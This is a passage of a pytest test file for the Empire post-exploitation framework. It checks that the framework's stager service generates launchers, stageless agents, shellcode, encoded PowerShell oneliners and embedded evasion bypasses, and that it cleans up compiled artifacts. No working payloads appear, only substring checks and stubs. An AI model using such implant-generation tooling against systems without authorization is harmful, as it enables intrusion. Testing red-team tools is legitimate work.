    launcher = stager_generation_service.generate_go_exe_oneliner_routed(
        language="go",
        listener_name=listener_name,
        obfuscate=False,
        obfuscation_command="",
        encode=False,
    )

    assert launcher, f"empty launcher for {listener_name}"
    assert "DownloadFile(" in launcher

    if must_contain_uri_substr is not None:
        assert must_contain_uri_substr in launcher, (
            f"expected {must_contain_uri_substr!r} in malleable launcher, got: {launcher}"
        )
    if must_not_contain_uri_substr is not None:
        assert must_not_contain_uri_substr not in launcher, (
            f"unexpected {must_not_contain_uri_substr!r} (post/get URI) leaked "
            f"into malleable launcher: {launcher}"
        )


def test_generate_dylib(stager_generation_service):
    """
    Tests the generate_dylib function to ensure it creates a dylib with an embedded launcher code.
    """
    launcher_code = "import os; print('Hello, World!')"
    arch = "x64"
    hijacker = False

    result = stager_generation_service.generate_dylib(launcher_code, arch, hijacker)

    assert result is not None, "generate_dylib returned None"
    assert len(result) > 9000  # noqa: PLR2004


def test_generate_appbundle(stager_generation_service):
    launcher_code = "import os; print('Hello, World!')"
    arch = "x64"
    icon = ""
    app_name = ""
    disarm = False

    result = stager_generation_service.generate_appbundle(
        launcher_code, arch, icon, app_name, disarm
    )

    assert result is not None, "generate_appbundle returned None"
    assert len(result) > 9000  # noqa: PLR2004


@pytest.mark.slow
def test_generate_jar(stager_generation_service):
    launcher_code = "import os; print('Hello, World!')"
    result = stager_generation_service.generate_jar(launcher_code)

    assert result is not None, "generate_jar returned None"
    assert len(result) > 1000  # noqa: PLR2004


@pytest.mark.parametrize(
    ("language", "expected_substrings"),
    [
        ("python", ["def run(", "server=", "class Stage"]),
        ("ironpython", ["def run(", "server=", "class Stage"]),
        (
            "powershell",
            [
                "function Invoke-Empire {",
                "function Start-Negotiate {",
                '$ErrorActionPreference = "SilentlyContinue"',
            ],
        ),
    ],
)
def test_generate_stageless(stager_generation_service, language, expected_substrings):
    """
    Test the generate_stageless function for different supported languages.
    """
    options = {
        "Listener": {"Value": "new-listener-1"},
        "Language": {"Value": language},
    }

    result = stager_generation_service.generate_stageless(options)

    assert result is not None, f"Stageless agent generation failed for {language}."
    assert isinstance(result, str), (
        f"Generated stageless agent for {language} should be a string."
    )

    for substring in expected_substrings:
        assert substring in result, (
            f"Expected '{substring}' in the generated {language} agent."
        )


def test_generate_upload(stager_generation_service):
    pass


def test_multi_generate_agent_stageless_powershell(main):
    stager = Stager(main)
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = "new-listener-1"
    stager.options["Staged"]["Value"] = False

    result = stager.generate()

    assert isinstance(result, str), "Expected generated code to be a string"
    assert "function Invoke-Empire {" in result
    assert "function Start-Negotiate {" in result
    assert '$ErrorActionPreference = "SilentlyContinue"' in result


def test_multi_generate_agent_staged_powershell(main):
    stager = Stager(main)
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = "new-listener-1"
    stager.options["Staged"]["Value"] = True

    result = stager.generate()

    assert isinstance(result, str), "Expected generated code to be a string"
    assert "function Invoke-Empire {" not in result
    assert "DownloadData(" in result or "WebClient" in result


def test_multi_generate_agent_stageless_python(main):
    stager = Stager(main)
    stager.options["Language"]["Value"] = "python"
    stager.options["Listener"]["Value"] = "new-listener-1"
    stager.options["Staged"]["Value"] = False

    result = stager.generate()

    assert isinstance(result, str), "Expected generated code to be a string"
    assert "def run(" in result
    assert "class Stage" in result


def _generate_stageless_agent(main, language, bypasses):
    stager = Stager(main)
    stager.options["Language"]["Value"] = language
    stager.options["Listener"]["Value"] = "new-listener-1"
    stager.options["Staged"]["Value"] = False
    stager.options["Bypasses"]["Value"] = bypasses
    return stager.generate()


def test_multi_generate_agent_stageless_powershell_embeds_bypass(main):
    """Empire#778: stageless generation must honor the Bypasses option, run
    under SilentlyContinue like the staged launcher, and run before the agent."""
    marker_a = "Expect100Continue=0"
    marker_b = "PSVersionTable.PSVersion.Major -lt 3"

    baseline = _generate_stageless_agent(main, "powershell", "")
    assert marker_a not in baseline
    assert marker_b not in baseline

    result = _generate_stageless_agent(main, "powershell", "SafeChecksPS")
    assert result.startswith('$ErrorActionPreference = "SilentlyContinue";')
    assert marker_a in result
    assert marker_b in result
    assert result.index(marker_b) < result.index("function Invoke-Empire {")


def test_multi_generate_agent_stageless_python_embeds_bypass(main):
    marker = "Little Snitch"

    baseline = _generate_stageless_agent(main, "python", "")
    assert marker not in baseline

    result = _generate_stageless_agent(main, "python", "SafeChecksPython")
    # SafeChecksPython calls sys.exit() without importing sys.
    assert result.startswith("import sys\n")
    assert marker in result
    assert result.index(marker) < result.index("def run(")
    compile(result, "<stageless-agent>", "exec")


def test_multi_generate_agent_stageless_joins_bypasses_without_trailing_newline(
    main,
):
    """API-created bypasses need not end in a newline; two in a row must not
    run into each other or into the agent's first line."""
    names = ["StagelessProbeA", "StagelessProbeB"]
    with SessionLocal.begin() as db:
        for i, name in enumerate(names):
            db.add(
                models.Bypass(
                    name=name, code=f"probe_{i} = {i}", language="python", authors=[]
                )
            )
    try:
        result = _generate_stageless_agent(main, "python", " ".join(names))
        assert "probe_0 = 0\nprobe_1 = 1\n" in result
        compile(result, "<stageless-agent>", "exec")
    finally:
        with SessionLocal.begin() as db:
            db.execute(delete(models.Bypass).where(models.Bypass.name.in_(names)))


def test_multi_generate_agent_stageless_ironpython_drops_python_bypass(main, caplog):
    with caplog.at_level(logging.WARNING):
        result = _generate_stageless_agent(main, "ironpython", "SafeChecksPython")

    assert not result.startswith("import sys\n")
    assert "Little Snitch" not in result
    assert any(
        "Dropping bypass" in r.message and r.levelname == "WARNING"
        for r in caplog.records
    ), "Expected WARNING-level language-mismatch log was not emitted"


@pytest.mark.skipif(is_arm, reason="Skipping test on ARM architecture")
@pytest.mark.parametrize(
    ("arch", "dot_net_version"),
    [
        ("x86", "net40"),
        ("x64", "net40"),
        ("both", "net40"),
        ("x86", "net35"),
        ("x64", "net35"),
        ("both", "net35"),
    ],
)
def test_generate_csharp_shellcode(stager_generation_service, arch, dot_net_version):
    shellcode, err = stager_generation_service.generate_csharp_shellcode(
        listener_name="new-listener-1",
        arch=arch,
        dot_net_version=dot_net_version,
    )

    assert err is None, f"Error occurred: {err}"
    assert isinstance(shellcode, bytes), (
        f"Shellcode should be bytes, but got {type(shellcode)}"
    )
    assert len(shellcode) > 100, f"Shellcode is too short: {len(shellcode)} bytes"  # noqa: PLR2004


@pytest.mark.skipif(is_arm, reason="Skipping test on ARM architecture")
@pytest.mark.parametrize(
    "language",
    [
        "powershell",
        "csharp",
    ],
)
def test_generate_shellcode(stager_generation_service, language):
    shellcode, err = stager_generation_service.generate_shellcode(
        language=language,
        listener_name="new-listener-1",
    )

    assert err is None, f"Error occurred: {err}"
    assert isinstance(shellcode, bytes), (
        f"Shellcode should be bytes, but got {type(shellcode)}"
    )
    assert len(shellcode) > 100, f"Shellcode is too short: {len(shellcode)} bytes"  # noqa: PLR2004


def _decode_ps_enc(text: str) -> str:
    m = re.search(r"-enc\s+([A-Za-z0-9+/=]+)", text)
    if not m:
        return text
    return base64.b64decode(m.group(1)).decode("utf-16le", errors="strict")


def test_multi_launcher_base64_native_bool_controls_encoding(main):
    """Regression guard for the native-bool migration: the multi launcher's
    `encode = base64` path must honor a native bool. A native False produces a
    readable (non -enc) launcher; a native True produces an -enc oneliner.
    Before the migration this was `base64.lower() == "true"`, so a string
    "False" was correctly falsy; now generate() trusts a native bool, and the
    module callers that feed it must pass one (see the powerbreach/powerup
    stager modules)."""
    stager = MultiLauncherStager(main)
    stager.options["Language"]["Value"] = "powershell"
    stager.options["Listener"]["Value"] = "new-listener-1"

    stager.options["Base64"]["Value"] = False
    plain = stager.generate()
    assert isinstance(plain, str)
    assert plain
    assert "-enc" not in plain, "native False must not engage base64 encoding"

    stager.options["Base64"]["Value"] = True
    encoded = stager.generate()
    assert isinstance(encoded, str)
    assert encoded
    assert "-enc" in encoded, "native True must engage base64 encoding"


def test_multi_launcher_csharp_embeds_ps_bypass(main):
    """End-to-end: the multi launcher with Language=csharp emits a PS oneliner
    that contains the PS bypass code (defended by BypassLanguage map)."""
    stager = MultiLauncherStager(main)
    stager.options["Language"]["Value"] = "csharp"
    stager.options["Listener"]["Value"] = "new-listener-1"
    stager.options["Base64"]["Value"] = True
    stager.options["Bypasses"]["Value"] = "SafeChecksPS"

    launcher = stager.generate()
    assert isinstance(launcher, str)
    assert launcher
    decoded = _decode_ps_enc(launcher)
    assert "Expect100Continue=0" in decoded
    assert "Reflection.Assembly" in decoded


def test_launcher_bat_go_embeds_ps_bypass(main):
    """windows/launcher_bat with Language=go uses the non-routed go oneliner;
    PS bypasses still must land in the emitted PS downloader."""
    stager = LauncherBatStager(main)
    stager.options["Language"]["Value"] = "go"
    stager.options["Listener"]["Value"] = "new-listener-1"
    stager.options["Bypasses"]["Value"] = "SafeChecksPS"
    stager.options["Delete"]["Value"] = False

    bat = stager.generate()
    assert isinstance(bat, str)
    assert bat
    decoded = _decode_ps_enc(bat)
    assert "Expect100Continue=0" in decoded
    assert "DownloadFile(" in decoded


class TestShellcodeArtifactCleanup:
    """The two donut sinks compile an EXE, keep only the shellcode, and used to
    leave the EXE behind.

    Both are reachable from the STAGE0 ``additional == "shellcode"`` branch,
    which needs only the staging key, so an unreclaimed multi-megabyte artifact
    per request is the durable half of the same DoS the listeners' cleanup
    closes. The compile and donut are both stubbed: this pins the cleanup, not
    EmpireCompiler or donut, so it runs on ARM and on a box with neither.
    """

    @pytest.fixture
    def artifact(self, tmp_path):
        exe = tmp_path / "stager_abc123.exe"
        exe.write_bytes(b"MZ" + b"\x00" * 64)
        return exe

    @pytest.mark.parametrize(
        ("donut_result", "case"),
        [(b"\x90\x90shellcode", "success"), (None, "donut-failed")],
        ids=["success", "donut-failed"],
    )
    def test_python_shellcode_removes_the_compiled_exe(
        self, stager_generation_service, artifact, monkeypatch, donut_result, case
    ):
        """Both arms: the ``donut_result is None`` branch returns early, so a
        cleanup placed after it would leak on exactly the failure an attacker
        can provoke repeatedly."""
        monkeypatch.setattr(
            "empire.server.core.stager_generation_service.donut", object()
        )
        monkeypatch.setattr(
            stager_generation_service, "generate_python_exe", lambda *a, **kw: artifact
        )
        monkeypatch.setattr(
            "empire.server.core.stager_generation_service.donut_create",
            lambda **kw: donut_result,
        )

        stager_generation_service.generate_python_shellcode("posh", "x64", "net40")

        assert not artifact.exists()

    def test_csharp_shellcode_removes_the_compiled_exe(
        self, stager_generation_service, artifact, monkeypatch
    ):
        monkeypatch.setattr(
            "empire.server.core.stager_generation_service.donut", object()
        )
        active = MagicMock()
        active.generate_launcher.return_value = str(artifact)
        monkeypatch.setattr(
            stager_generation_service.listener_service,
            "get_active_listener",
            lambda _id: active,
        )
        monkeypatch.setattr(
            "empire.server.core.stager_generation_service.donut_create",
            lambda **kw: b"\x90\x90shellcode",
        )

        _shellcode, err = stager_generation_service.generate_csharp_shellcode(
            listener_name="new-listener-1", arch="x64"
        )

        assert err is None, err
        assert not artifact.exists()

    def test_an_unremovable_artifact_does_not_lose_the_shellcode(
        self, stager_generation_service, artifact, monkeypatch
    ):
        """Cleanup is best-effort: a compile that just succeeded must not be
        thrown away because the temp file could not be unlinked."""
        monkeypatch.setattr(
            "empire.server.core.stager_generation_service.donut", object()
        )
        monkeypatch.setattr(
            stager_generation_service, "generate_python_exe", lambda *a, **kw: artifact
        )
        monkeypatch.setattr(
            "empire.server.core.stager_generation_service.donut_create",
            lambda **kw: b"\x90\x90shellcode",
        )

        def _refuse(self, **kwargs):
            raise PermissionError("read-only tempdir")

        monkeypatch.setattr("pathlib.Path.unlink", _refuse)

        shellcode, err = stager_generation_service.generate_python_shellcode(
            "posh", "x64", "net40"
        )

        assert err is None
        assert shellcode == b"\x90\x90shellcode"


@pytest.mark.parametrize(
    ("cookie_value", "expected"),
    [("PHPSESSID", "PHPSESSID"), ("", "session")],
    ids=["custom", "empty-falls-back"],
)
def test_build_template_vars_session_cookie(
    stager_generation_service, monkeypatch, cookie_value, expected
):
    """gopire carries the routing packet in the listener's session cookie on
    tasking GETs; an empty Cookie option (allowed on malleable listeners) must
    still render a usable name."""
    active_listener = (
        stager_generation_service.listener_service.get_active_listener_by_name(
            "new-listener-1"
        )
    )
    monkeypatch.setitem(active_listener.options["Cookie"], "Value", cookie_value)
    assert (
        stager_generation_service._build_template_vars(active_listener)[
            "SESSION_COOKIE"
        ]
        == expected
    )
